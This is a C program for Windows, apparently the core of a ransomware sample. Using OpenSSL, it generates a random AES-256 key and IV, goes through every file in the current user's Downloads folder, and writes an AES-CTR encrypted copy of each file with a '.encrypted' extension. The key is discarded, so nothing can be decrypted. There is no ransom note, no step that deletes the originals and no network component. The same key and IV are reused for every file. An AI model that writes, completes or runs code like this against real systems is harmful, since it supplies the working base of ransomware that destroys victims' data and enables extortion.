#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <windows.h>

#define AES_KEY_SIZE 32
#define AES_BLOCK_SIZE 16

// Function to handle AES encryption
int aes_encrypt(EVP_CIPHER_CTX *ctx, unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext) {
    int len;
    int ciphertext_len;

    if (!EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv)) {
        printf("Error initializing AES encryption\n");
        return -1;
    }

    if (!EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len)) {
        printf("Error encrypting\n");
        return -1;
    }
    ciphertext_len = len;

    if (!EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) {
        printf("Error finalizing encryption\n");
        return -1;
    }
    ciphertext_len += len;

    return ciphertext_len;
}

// Function to generate a random key and IV
void generate_key_iv(unsigned char *key, unsigned char *iv) {
    if (!RAND_bytes(key, AES_KEY_SIZE)) {
        printf("Error generating key\n");
        exit(1);
    }

    if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
        printf("Error generating IV\n");
        exit(1);
    }
}

// Function to encrypt a file
int encrypt_file(const char *file_path, unsigned char *key, unsigned char *iv) {
    FILE *file = fopen(file_path, "rb");
    if (!file) {
        printf("Error opening file\n");
        return -1;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *plaintext = malloc(file_size);
    if (!plaintext) {
        printf("Memory allocation failed\n");
        fclose(file);
        return -1;
    }
    
    fread(plaintext, 1, file_size, file);
    fclose(file);

    // Prepare encryption
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        printf("Error creating EVP context\n");
        free(plaintext);
        return -1;
    }

    unsigned char *ciphertext = malloc(file_size + AES_BLOCK_SIZE);
    if (!ciphertext) {
        printf("Memory allocation for ciphertext failed\n");
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return -1;
    }

    // Perform encryption in AES-CTR mode
    int ciphertext_len = aes_encrypt(ctx, plaintext, file_size, key, iv, ciphertext);

    if (ciphertext_len == -1) {
        printf("Error encrypting file\n");
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        free(ciphertext);
        return -1;
    }

    // Save encrypted data to file
    char encrypted_file[1024];
    snprintf(encrypted_file, sizeof(encrypted_file), "%s.encrypted", file_path);
    file = fopen(encrypted_file, "wb");
    if (!file) {
        printf("Error opening encrypted file for writing\n");
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        free(ciphertext);
        return -1;
    }

    fwrite(ciphertext, 1, ciphertext_len, file);
    fclose(file);

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);
    free(plaintext);
    free(ciphertext);

    printf("Encrypted file saved to: %s\n", encrypted_file);
    return 0;
}

// Function to iterate over files in the Downloads folder and encrypt them
void encrypt_downloads_folder() {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\Downloads\\*", getenv("USERPROFILE"));

    WIN32_FIND_DATA find_file_data;
    HANDLE hFind = FindFirstFile(path, &find_file_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error accessing Downloads folder\n");
        return;
    }

    unsigned char key[AES_KEY_SIZE];
    unsigned char iv[AES_BLOCK_SIZE];
    generate_key_iv(key, iv);

    do {
        if (!(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            // File found, encrypt it
            char full_file_path[MAX_PATH];
            snprintf(full_file_path, sizeof(full_file_path), "%s\\Downloads\\%s", getenv("USERPROFILE"), find_file_data.cFileName);
            encrypt_file(full_file_path, key, iv);
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    FindClose(hFind);
}

int main() {
    encrypt_downloads_folder();
    return 0;
}
